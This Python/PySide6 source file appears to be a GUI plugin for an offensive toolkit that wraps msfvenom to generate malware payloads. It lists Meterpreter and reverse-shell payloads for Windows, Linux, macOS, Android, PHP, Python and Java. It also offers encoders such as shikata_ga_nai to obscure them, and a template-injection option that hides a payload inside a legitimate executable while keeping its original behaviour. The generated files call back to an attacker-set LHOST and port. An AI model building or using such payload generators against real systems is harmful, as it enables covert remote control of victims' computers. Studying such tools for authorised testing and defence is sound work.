# =============================================================================
# modules/msfvenom.py
#
# MSFVenom - Payload Generator Tool
# =============================================================================

import os
import subprocess
from datetime import datetime
from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QGroupBox, QFrame, QScrollArea, QApplication, QProgressBar,
    QMessageBox, QFileDialog
)
from PySide6.QtCore import Qt
from PySide6.QtGui import QFont

from modules.bases import ToolBase, ToolCategory
from core.fileops import RESULT_BASE
from ui.styles import (
    StyledLineEdit, StyledSpinBox, StyledCheckBox, StyledComboBox,
    StyledLabel, HeaderLabel, CommandDisplay, BrowseButton,
    StyledGroupBox, SafeStop, OutputHelper,
    TOOL_VIEW_STYLE, COLOR_TEXT_PRIMARY, COLOR_BACKGROUND_SECONDARY,
    COLOR_BTN_PRIMARY, COLOR_BTN_PRIMARY_HOVER,
    COLOR_ACCENT
)


class StatusCard(QFrame):
    """Visual status card for pipeline steps."""
    
    STATUS_PENDING = "pending"
    STATUS_RUNNING = "running"
    STATUS_SUCCESS = "success"
    STATUS_ERROR = "error"
    
    def __init__(self, title, description="", parent=None):
        super().__init__(parent)
        self.title = title
        self.description = description
        self.status = self.STATUS_PENDING
        self._build_ui()
        self.update_style()
        
    def _build_ui(self):
        self.setFixedHeight(70)
        self.setMinimumWidth(180)
        
        layout = QVBoxLayout(self)
        layout.setContentsMargins(10, 8, 10, 8)
        layout.setSpacing(3)
        
        header = QHBoxLayout()
        self.icon_label = QLabel("⏳")
        self.icon_label.setFont(QFont("Segoe UI Emoji", 14))
        header.addWidget(self.icon_label)
        
        self.title_label = QLabel(self.title)
        self.title_label.setFont(QFont("Segoe UI", 10, QFont.Bold))
        header.addWidget(self.title_label)
        header.addStretch()
        layout.addLayout(header)
        
        self.detail_label = QLabel(self.description)
        self.detail_label.setFont(QFont("Segoe UI", 8))
        self.detail_label.setStyleSheet(f"color: {COLOR_TEXT_PRIMARY};")
        layout.addWidget(self.detail_label)
    
    def update_style(self):
        colors = {
            self.STATUS_PENDING: ("#2A2A3E", "#444", "⏳"),
            self.STATUS_RUNNING: ("#1E3A5F", "#3B82F6", "⚡"),
            self.STATUS_SUCCESS: ("#1A3D2F", "#10B981", "✅"),
            self.STATUS_ERROR: ("#3D1A1A", "#EF4444", "❌"),
        }
        bg, border, icon = colors.get(self.status, colors[self.STATUS_PENDING])
        self.setStyleSheet(f"QFrame {{ background: {bg}; border: 2px solid {border}; border-radius: 8px; }}")
        self.icon_label.setText(icon)
    
    def set_status(self, status, detail=None):
        self.status = status
        if detail:
            self.detail_label.setText(detail)
        self.update_style()


class MSFVenomTool(ToolBase):
    """MSFVenom Payload Generator tool plugin."""

    @property
    def name(self) -> str:
        return "MSFVenom"

    @property
    def category(self):
        return ToolCategory.PAYLOAD_GENERATOR

    def get_widget(self, main_window: QWidget) -> QWidget:
        return MSFVenomToolView(main_window=main_window)


class MSFVenomToolView(QWidget, SafeStop, OutputHelper):
    """MSFVenom payload generator interface."""

    PAYLOADS = {
        "Windows (x64)": {
            "Meterpreter Staged": "windows/x64/meterpreter/reverse_tcp",
            "Meterpreter Stageless": "windows/x64/meterpreter_reverse_tcp",
            "Shell Staged": "windows/x64/shell/reverse_tcp",
            "Shell Stageless": "windows/x64/shell_reverse_tcp",
        },
        "Windows (x86)": {
            "Meterpreter Staged": "windows/meterpreter/reverse_tcp",
            "Meterpreter Stageless": "windows/meterpreter_reverse_tcp",
            "Shell Staged": "windows/shell/reverse_tcp",
            "Shell Stageless": "windows/shell_reverse_tcp",
        },
        "Linux (x64)": {
            "Meterpreter Staged": "linux/x64/meterpreter/reverse_tcp",
            "Shell Stageless": "linux/x64/shell_reverse_tcp",
        },
        "Linux (x86)": {
            "Meterpreter Staged": "linux/x86/meterpreter/reverse_tcp",
            "Shell Stageless": "linux/x86/shell_reverse_tcp",
        },
        "macOS (x64)": {
            "Meterpreter Staged": "osx/x64/meterpreter/reverse_tcp",
            "Shell Stageless": "osx/x64/shell_reverse_tcp",
        },
        "Android": {
            "Meterpreter": "android/meterpreter/reverse_tcp",
        },
        "PHP": {
            "Meterpreter": "php/meterpreter_reverse_tcp",
            "Reverse PHP": "php/reverse_php",
        },
        "Python": {
            "Meterpreter": "python/meterpreter_reverse_tcp",
            "Shell": "cmd/unix/reverse_python",
        },
        "Java/JSP": {
            "JSP Shell": "java/jsp_shell_reverse_tcp",
            "WAR Shell": "java/shell_reverse_tcp",
        },
    }

    ENCODERS = {
        "None": "",
        "x86/shikata_ga_nai": "x86/shikata_ga_nai",
        "x64/xor": "x64/xor",
        "x86/fnstenv_mov": "x86/fnstenv_mov",
        "php/base64": "php/base64",
    }

    FORMATS = {
        "Windows EXE": "exe",
        "Windows DLL": "dll",
        "Linux ELF": "elf",
        "macOS Macho": "macho",
        "Android APK": "apk",
        "Raw": "raw",
        "C Code": "c",
        "Python": "python",
        "PowerShell": "psh",
        "PHP": "php",
        "JSP": "jsp",
        "WAR": "war",
    }

    def __init__(self, main_window=None):
        super().__init__()
        self.init_safe_stop()
        self.main_window = main_window
        self.worker = None
        self.output_path = None
        self._build_ui()

    def _build_ui(self):
        self.setStyleSheet(TOOL_VIEW_STYLE)

        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(10)

        # Header
        header = HeaderLabel("PAYLOAD_GENERATOR", "MSFVenom")
        main_layout.addWidget(header)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("QScrollArea { border: none; }")

        content = QWidget()
        layout = QVBoxLayout(content)
        layout.setSpacing(12)

        # Connection Group
        conn_group = StyledGroupBox("🔌 Connection")
        conn_layout = QHBoxLayout(conn_group)

        conn_layout.addWidget(StyledLabel("LHOST:"))
        self.lhost_input = StyledLineEdit("Your IP address")
        self.lhost_input.textChanged.connect(self._update_cmd)
        conn_layout.addWidget(self.lhost_input, 1)

        from PySide6.QtWidgets import QPushButton
        detect_btn = QPushButton("🔍 Detect")
        detect_btn.clicked.connect(self._detect_ip)
        detect_btn.setStyleSheet(f"""
            QPushButton {{
                background: {COLOR_BTN_PRIMARY};
                color: white;
                border: none;
                border-radius: 4px;
                padding: 8px 12px;
                font-weight: bold;
            }}
            QPushButton:hover {{ background: {COLOR_BTN_PRIMARY_HOVER}; }}
        """)
        detect_btn.setCursor(Qt.PointingHandCursor)
        conn_layout.addWidget(detect_btn)

        conn_layout.addWidget(StyledLabel("LPORT:"))
        self.lport_spin = StyledSpinBox()
        self.lport_spin.setRange(1, 65535)
        self.lport_spin.setValue(4444)
        self.lport_spin.valueChanged.connect(self._update_cmd)
        conn_layout.addWidget(self.lport_spin)

        layout.addWidget(conn_group)

        # Payload Group
        payload_group = StyledGroupBox("🎯 Payload")
        payload_layout = QVBoxLayout(payload_group)

        row1 = QHBoxLayout()
        row1.addWidget(StyledLabel("Platform:"))
        self.platform_combo = StyledComboBox()
        self.platform_combo.addItems(list(self.PAYLOADS.keys()))
        self.platform_combo.currentTextChanged.connect(self._update_payloads)
        row1.addWidget(self.platform_combo, 1)

        row1.addWidget(StyledLabel("Payload:"))
        self.payload_combo = StyledComboBox()
        self.payload_combo.currentTextChanged.connect(self._update_cmd)
        row1.addWidget(self.payload_combo, 1)
        payload_layout.addLayout(row1)

        row2 = QHBoxLayout()
        row2.addWidget(StyledLabel("Format:"))
        self.format_combo = StyledComboBox()
        self.format_combo.addItems(list(self.FORMATS.keys()))
        self.format_combo.currentTextChanged.connect(self._update_cmd)
        row2.addWidget(self.format_combo)

        row2.addWidget(StyledLabel("Arch:"))
        self.arch_combo = StyledComboBox()
        self.arch_combo.addItems(["(auto)", "x86", "x64"])
        self.arch_combo.currentTextChanged.connect(self._update_cmd)
        row2.addWidget(self.arch_combo)
        payload_layout.addLayout(row2)

        layout.addWidget(payload_group)

        # Encoder Group
        enc_group = StyledGroupBox("🔐 Encoding")
        enc_layout = QHBoxLayout(enc_group)

        enc_layout.addWidget(StyledLabel("Encoder:"))
        self.encoder_combo = StyledComboBox()
        self.encoder_combo.addItems(list(self.ENCODERS.keys()))
        self.encoder_combo.currentTextChanged.connect(self._update_cmd)
        enc_layout.addWidget(self.encoder_combo, 1)

        enc_layout.addWidget(StyledLabel("Iterations:"))
        self.iter_spin = StyledSpinBox()
        self.iter_spin.setRange(1, 20)
        self.iter_spin.setValue(3)
        self.iter_spin.valueChanged.connect(self._update_cmd)
        enc_layout.addWidget(self.iter_spin)

        enc_layout.addWidget(StyledLabel("Bad chars:"))
        self.badchars = StyledLineEdit("\\x00\\x0a\\x0d")
        self.badchars.setMaximumWidth(120)
        self.badchars.textChanged.connect(self._update_cmd)
        enc_layout.addWidget(self.badchars)

        enc_layout.addWidget(StyledLabel("NOPs:"))
        self.nops_spin = StyledSpinBox()
        self.nops_spin.setRange(0, 100)
        self.nops_spin.setValue(0)
        self.nops_spin.valueChanged.connect(self._update_cmd)
        enc_layout.addWidget(self.nops_spin)

        layout.addWidget(enc_group)

        # Template Group
        tmpl_group = StyledGroupBox("📦 Template Injection")
        tmpl_layout = QHBoxLayout(tmpl_group)

        self.template_check = StyledCheckBox("Use Template")
        self.template_check.stateChanged.connect(self._toggle_template)
        tmpl_layout.addWidget(self.template_check)

        self.template_input = StyledLineEdit("Select template file...")
        self.template_input.setEnabled(False)
        tmpl_layout.addWidget(self.template_input, 1)

        self.template_btn = BrowseButton()
        self.template_btn.clicked.connect(self._browse_template)
        self.template_btn.setEnabled(False)
        tmpl_layout.addWidget(self.template_btn)

        self.keep_check = StyledCheckBox("Keep original")
        self.keep_check.setEnabled(False)
        tmpl_layout.addWidget(self.keep_check)

        layout.addWidget(tmpl_group)

        # Output Group
        out_group = StyledGroupBox("💾 Output")
        out_layout = QHBoxLayout(out_group)

        self.custom_check = StyledCheckBox("Custom path")
        self.custom_check.stateChanged.connect(self._toggle_custom)
        out_layout.addWidget(self.custom_check)

        self.output_input = StyledLineEdit("Auto-generated in VAJRA results")
        self.output_input.setReadOnly(True)
        out_layout.addWidget(self.output_input, 1)

        self.output_btn = BrowseButton()
        self.output_btn.clicked.connect(self._browse_output)
        self.output_btn.setEnabled(False)
        out_layout.addWidget(self.output_btn)

        layout.addWidget(out_group)

        # Command Display
        self.cmd_display = CommandDisplay()
        layout.addWidget(self.cmd_display)

        # Generate Button
        from PySide6.QtWidgets import QPushButton
        self.gen_btn = QPushButton("🚀 Generate Payload")
        self.gen_btn.setStyleSheet(f"""
            QPushButton {{
                background: #f97316;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 10px 16px;
                font-weight: bold;
                font-size: 14px;
            }}
            QPushButton:hover {{ background: #ea580c; }}
        """)
        self.gen_btn.setCursor(Qt.PointingHandCursor)
        self.gen_btn.clicked.connect(self._generate)
        layout.addWidget(self.gen_btn)

        # Progress
        self.progress = QProgressBar()
        self.progress.setVisible(False)
        layout.addWidget(self.progress)

        # Result Frame
        self.result = QFrame()
        self.result.setVisible(False)
        self.result.setStyleSheet("QFrame { background: #1A2E28; border: 2px solid #10B981; border-radius: 8px; padding: 12px; }")
        res_layout = QVBoxLayout(self.result)
        
        res_header = QHBoxLayout()
        self.res_icon = QLabel("✅")
        self.res_icon.setFont(QFont("Segoe UI Emoji", 24))
        res_header.addWidget(self.res_icon)
        self.res_title = QLabel("Payload Generated!")
        self.res_title.setStyleSheet("color: #10B981; font-size: 16px; font-weight: bold;")
        res_header.addWidget(self.res_title)
        res_header.addStretch()
        res_layout.addLayout(res_header)
        
        self.res_path = QLabel("")
        self.res_path.setStyleSheet(f"color: {COLOR_TEXT_PRIMARY}; font-size: 12px;")
        self.res_path.setWordWrap(True)
        res_layout.addWidget(self.res_path)
        
        res_btns = QHBoxLayout()
        open_btn = QPushButton("📂 Open Folder")
        open_btn.clicked.connect(self._open_folder)
        open_btn.setStyleSheet(f"""
            QPushButton {{
                background: {COLOR_BTN_PRIMARY};
                color: white;
                border: none;
                border-radius: 4px;
                padding: 8px 12px;
                font-weight: bold;
            }}
            QPushButton:hover {{ background: {COLOR_BTN_PRIMARY_HOVER}; }}
        """)
        res_btns.addWidget(open_btn)
        
        copy_btn = QPushButton("📋 Copy Path")
        copy_btn.clicked.connect(self._copy_path)
        copy_btn.setStyleSheet(f"""
            QPushButton {{
                background: #8b5cf6;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 8px 12px;
                font-weight: bold;
            }}
            QPushButton:hover {{ background: #7c3aed; }}
        """)
        res_btns.addWidget(copy_btn)
        res_btns.addStretch()
        res_layout.addLayout(res_btns)
        
        layout.addWidget(self.result)
        layout.addStretch()

        scroll.setWidget(content)
        main_layout.addWidget(scroll)

        # Initialize UI
        self._update_payloads()

    def _update_payloads(self):
        p = self.platform_combo.currentText()
        self.payload_combo.clear()
        if p in self.PAYLOADS:
            self.payload_combo.addItems(list(self.PAYLOADS[p].keys()))
        self._update_cmd()

    def _toggle_template(self, state):
        enabled = self.template_check.isChecked()
        self.template_input.setEnabled(enabled)
        self.template_btn.setEnabled(enabled)
        self.keep_check.setEnabled(enabled)

    def _toggle_custom(self, state):
        enabled = self.custom_check.isChecked()
        self.output_input.setReadOnly(not enabled)
        self.output_btn.setEnabled(enabled)
        if not enabled:
            self.output_input.clear()
            self.output_input.setPlaceholderText("Auto-generated in VAJRA results")

    def _browse_template(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Template Executable", os.path.expanduser("~"),
            "Executables (*.exe *.apk *.elf *.bin *.dll);;All Files (*)"
        )
        if path:
            self.template_input.setText(path)

    def _browse_output(self):
        ext = self._ext()
        path, _ = QFileDialog.getSaveFileName(
            self, "Save Payload As", os.path.expanduser(f"~/payload{ext}"),
            f"Payload (*{ext});;All Files (*)"
        )
        if path:
            self.output_input.setText(path)

    def _detect_ip(self):
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.lhost_input.setText(s.getsockname()[0])
            s.close()
        except:
            self.lhost_input.setPlaceholderText("Detection failed")

    def _ext(self):
        fmt = self.FORMATS.get(self.format_combo.currentText(), "bin")
        m = {"exe": ".exe", "dll": ".dll", "elf": ".elf", 
             "macho": ".macho", "apk": ".apk", "raw": ".bin", "c": ".c", 
             "python": ".py", "psh": ".ps1", "php": ".php", "jsp": ".jsp", "war": ".war"}
        return m.get(fmt, ".bin")

    def _build_cmd(self):
        cmd = ["msfvenom"]
        
        platform_name = self.platform_combo.currentText()
        payload = self.payload_combo.currentText()
        if platform_name in self.PAYLOADS and payload in self.PAYLOADS[platform_name]:
            cmd.extend(["-p", self.PAYLOADS[platform_name][payload]])
        
        lhost = self.lhost_input.text().strip()
        if lhost:
            cmd.append(f"LHOST={lhost}")
        cmd.append(f"LPORT={self.lport_spin.value()}")
        
        arch = self.arch_combo.currentText()
        if arch != "(auto)":
            cmd.extend(["-a", arch])
        
        encoder = self.ENCODERS.get(self.encoder_combo.currentText(), "")
        if encoder:
            cmd.extend(["-e", encoder, "-i", str(self.iter_spin.value())])
        
        bc = self.badchars.text().strip()
        if bc:
            cmd.extend(["-b", bc])
        
        nops = self.nops_spin.value()
        if nops > 0:
            cmd.extend(["-n", str(nops)])
        
        if self.template_check.isChecked() and self.template_input.text().strip():
            cmd.extend(["-x", self.template_input.text().strip()])
            if self.keep_check.isChecked():
                cmd.append("-k")
        
        fmt = self.FORMATS.get(self.format_combo.currentText(), "raw")
        cmd.extend(["-f", fmt, "-o", "<output>"])
        
        return cmd

    def _update_cmd(self):
        self.cmd_display.setText(" ".join(self._build_cmd()))

    def _output_path(self):
        if self.custom_check.isChecked() and self.output_input.text().strip():
            return self.output_input.text().strip()
        
        ts = datetime.now().strftime("%d%m%Y_%H%M%S")
        platform = self.platform_combo.currentText().lower().replace(" ", "_").replace("(", "").replace(")", "")
        d = os.path.join(RESULT_BASE, f"payloads_{ts}")
        os.makedirs(d, exist_ok=True)
        return os.path.join(d, f"payload_{platform}{self._ext()}")

    def _generate(self):
        if not self.lhost_input.text().strip():
            QMessageBox.warning(self, "Validation Error", "Please enter LHOST (your IP address).")
            return
        
        if self.template_check.isChecked() and not self.template_input.text().strip():
            QMessageBox.warning(self, "Validation Error", "You enabled template injection but did not select a template file.")
            return
        
        self.result.setVisible(False)
        self.output_path = self._output_path()
        self.output_input.setText(self.output_path)
        
        cmd = self._build_cmd()
        cmd = [self.output_path if c == "<output>" else c for c in cmd]
        
        self.gen_btn.setEnabled(False)
        self.progress.setVisible(True)
        self.progress.setValue(0)
        
        try:
            self.progress.setValue(50)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            self.progress.setValue(100)
            
            if result.returncode == 0 and os.path.exists(self.output_path):
                self._done(True, self.output_path)
            else:
                error_msg = result.stderr or result.stdout or "Unknown error"
                self._done(False, error_msg)
        except subprocess.TimeoutExpired:
            self._done(False, "Generation timed out (120s)")
        except FileNotFoundError:
            self._done(False, "msfvenom not found. Is Metasploit installed?")
        except Exception as e:
            self._done(False, str(e))

    def _done(self, success, msg):
        self.gen_btn.setEnabled(True)
        self.progress.setVisible(False)
        
        self.result.setVisible(True)
        if success:
            self.result.setStyleSheet("QFrame { background: #1A2E28; border: 2px solid #10B981; border-radius: 8px; padding: 12px; }")
            self.res_icon.setText("✅")
            self.res_title.setText("Payload Generated Successfully!")
            self.res_title.setStyleSheet("color: #10B981; font-size: 16px; font-weight: bold;")
            size = os.path.getsize(msg) if os.path.exists(msg) else 0
            self.res_path.setText(f"📍 {msg}\n📦 Size: {size:,} bytes")
            self._notify("Payload generated!")
        else:
            self.result.setStyleSheet("QFrame { background: #2D1F1F; border: 2px solid #EF4444; border-radius: 8px; padding: 12px; }")
            self.res_icon.setText("❌")
            self.res_title.setText("Generation Failed")
            self.res_title.setStyleSheet("color: #EF4444; font-size: 16px; font-weight: bold;")
            self.res_path.setText(f"❌ {msg}")
            self._notify(f"Failed: {msg[:40]}")

    def _open_folder(self):
        if self.output_path:
            import sys
            folder = os.path.dirname(self.output_path)
            if sys.platform == "win32":
                subprocess.run(["explorer", folder])
            elif sys.platform == "darwin":
                subprocess.run(["open", folder])
            else:
                subprocess.run(["xdg-open", folder])

    def _copy_path(self):
        if self.output_path:
            QApplication.clipboard().setText(self.output_path)
            self._notify("Path copied!")

    def stop_all_workers(self):
        if self.worker:
            self.worker.stop()
            self.worker.wait(2000)
            self.worker = None
